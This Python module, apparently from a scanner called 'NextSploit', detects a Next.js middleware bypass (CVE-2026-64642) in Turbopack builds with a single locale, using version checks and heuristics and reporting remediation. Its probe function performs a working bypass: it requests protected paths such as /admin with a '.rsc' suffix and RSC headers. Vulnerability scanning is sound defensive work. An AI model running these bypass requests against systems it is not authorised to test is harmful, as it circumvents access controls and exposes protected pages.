#!/usr/bin/env python3
"""
NextSploit — CVE-2026-64642: Middleware Bypass via App Router + Turbopack + Single-Locale i18n

Root Cause:
  App Router applications built with Turbopack and exactly one locale in
  config.i18n.locales are vulnerable to middleware/proxy bypass. Segment-prefetch
  route variants bypass middleware because the Turbopack-generated routing table
  does not correctly normalize single-locale i18n paths before middleware matching.

Detection Strategy:
  1. Version-based check (primary).
  2. App Router precondition: config.has_app_router().
  3. Heuristic detection of Turbopack build (chunk naming pattern).
  4. Heuristic detection of single-locale i18n (prefix pattern in HTML/links).
  5. Probe bypass paths — if preconditions cannot be confirmed, result is INCONCLUSIVE.

Affected Versions:
  >= 15.0.0, < 15.5.21  (branch 15.x)
  >= 16.0.0, < 16.2.11  (branch 16.x)
Fixed In       : 15.5.21 / 16.2.11
Severity       : High
"""

import re
import requests

from core.config import ScanConfig, CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_debug, log_error, print_finding,
)

CVE_ID   = "CVE-2026-64642"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Turbopack chunk naming: uses content-hash filenames, no "webpack" in chunk name
_TURBOPACK_CHUNK_RE = re.compile(
    r'/_next/static/chunks/(?!webpack|main|pages|app)[a-f0-9]{16,}\.js'
)
_WEBPACK_CHUNK_RE = re.compile(r'/_next/static/chunks/webpack')

# Locale prefix patterns in HTML links — detect if only ONE locale is present
_LOCALE_LINK_RE = re.compile(r'(?:href|src)=["\']/([a-z]{2}(?:-[A-Z]{2})?)/(?!_next)')


def _detect_turbopack(page_text: str) -> tuple:
    """Heuristic: detect if build uses Turbopack vs webpack."""
    has_turbopack_chunks = bool(_TURBOPACK_CHUNK_RE.search(page_text))
    has_webpack = bool(_WEBPACK_CHUNK_RE.search(page_text))
    if has_turbopack_chunks and not has_webpack:
        return True, 0.65
    if has_turbopack_chunks:
        return True, 0.45
    return False, 0.0


def _detect_single_locale(page_text: str) -> tuple:
    """Heuristic: detect if app uses a single i18n locale."""
    locales_found = set(_LOCALE_LINK_RE.findall(page_text))
    if len(locales_found) == 1:
        return True, list(locales_found)[0], 0.55
    if len(locales_found) == 0:
        return False, None, 0.0  # no locale links found at all
    return False, None, 0.0  # multiple locales → not single-locale config


def _probe_bypass(session: requests.Session, target: str, locale: str, timeout: int) -> tuple:
    """
    Probe bypass via segment-prefetch paths with a single-locale prefix.
    """
    bypass_paths = [
        f"/{locale}/admin",
        f"/{locale}/dashboard",
        f"/{locale}/api/me",
    ]
    for path in bypass_paths:
        # Normal request
        try:
            r_normal = session.get(f"{target}{path}", timeout=timeout, allow_redirects=False)
            # Bypass attempt: append .rsc to same path
            r_bypass = session.get(
                f"{target}{path}.rsc",
                headers={"RSC": "1", "Next-Router-State-Tree": "[]"},
                timeout=timeout,
                allow_redirects=False,
            )
            if r_normal.status_code in (302, 307, 401, 403) and r_bypass.status_code == 200:
                return True, {
                    "path": path,
                    "normal_status": r_normal.status_code,
                    "bypass_status": r_bypass.status_code,
                    "bypass_url": f"{target}{path}.rsc",
                }
        except requests.RequestException as e:
            log_debug(f"Probe error for {path}: {e}")
    return False, {}


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    # Precondition: App Router required
    if not config.has_app_router():
        result.status = "NOT_APPLICABLE"
        log_info(f"[{CVE_ID}] Pages Router detected — skipping (App Router only).")
        return result

    session = config.create_session()
    target  = config.target.rstrip("/")

    log_info(f"Starting {CVE_ID} scan — Middleware bypass Turbopack + single-locale...")

    # Version check
    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None
    version_vulnerable = False

    if version_detected:
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "PATCHED":
            log_success(f"Version {version_detected} is patched for {CVE_ID}.")
            return result
        if vuln_status == "VULNERABLE":
            version_vulnerable = True
            log_warning(f"Version {version_detected} is in the vulnerable range.")

    # Fetch main page for heuristic analysis
    page_text = ""
    try:
        r_main = session.get(target, timeout=config.timeout)
        page_text = r_main.text
    except requests.RequestException as e:
        log_debug(f"Could not fetch main page for heuristic analysis: {e}")

    turbopack_detected, turbopack_conf = _detect_turbopack(page_text)
    single_locale, locale_code, locale_conf = _detect_single_locale(page_text)

    log_debug(f"Turbopack detected: {turbopack_detected} (conf={turbopack_conf:.2f})")
    log_debug(f"Single locale detected: {single_locale} locale={locale_code} (conf={locale_conf:.2f})")

    preconditions_confirmed = turbopack_detected and single_locale

    # If preconditions cannot be confirmed from black-box — set INCONCLUSIVE
    if not preconditions_confirmed:
        result.status = "INCONCLUSIVE"
        result.confidence = 0.30
        detail = (
            f"[{CVE_ID}] Could not confirm Turbopack build or single-locale i18n from "
            "black-box probing. The vulnerability requires both conditions to be exploitable. "
            "Manual review recommended."
        )
        log_warning(detail)
        result.add_finding(Finding(
            cve=CVE_ID,
            severity=CVE_INFO["severity"],
            title="Middleware Bypass (Turbopack + i18n) — Preconditions Unconfirmed",
            status="INCONCLUSIVE",
            detail=detail,
            evidence={
                "turbopack_detected": turbopack_detected,
                "single_locale_detected": single_locale,
                "locale_code": locale_code,
                "version": version_detected or "unknown",
                "note": "Requires --confirm-active or manual testing to verify.",
            },
            confidence=0.30,
        ))
        return result

    # Preconditions confirmed — probe bypass paths
    log_warning(f"Turbopack build + single locale '{locale_code}' detected — probing bypass...")
    bypassed, bypass_evidence = _probe_bypass(session, target, locale_code, config.timeout)

    if bypassed and version_vulnerable:
        detail     = (
            f"CONFIRMED: Next.js {version_detected} with Turbopack + single-locale "
            f"'{locale_code}'. Middleware bypass via .rsc path confirmed."
        )
        confidence = 0.92
    elif bypassed:
        detail     = (
            f"Middleware bypass via .rsc path confirmed (locale '{locale_code}' + Turbopack). "
            "Version not confirmed — vulnerable if < 15.5.21 or < 16.2.11."
        )
        confidence = 0.70
    elif version_vulnerable:
        detail     = (
            f"Version {version_detected} + Turbopack + single-locale '{locale_code}' detected "
            "but bypass probe did not return 200 on .rsc path. Target may be patched or paths differ."
        )
        confidence = 0.40
    else:
        log_success(f"No {CVE_ID} bypass indicators confirmed.")
        return result

    evidence = {
        "turbopack_detected": True,
        "locale_code": locale_code,
        "detected_version": version_detected or "unknown",
        "remediation": "Upgrade to Next.js 15.5.21+ (15.x) or 16.2.11+ (16.x).",
        **bypass_evidence,
    }
    log_warning(detail)
    print_finding(CVE_ID, detail, evidence)
    result.add_finding(Finding(
        cve=CVE_ID,
        severity=CVE_INFO["severity"],
        title="Middleware Bypass — Turbopack + Single-Locale i18n",
        status="VULNERABLE",
        detail=detail,
        evidence=evidence,
        confidence=confidence,
    ))
    return result
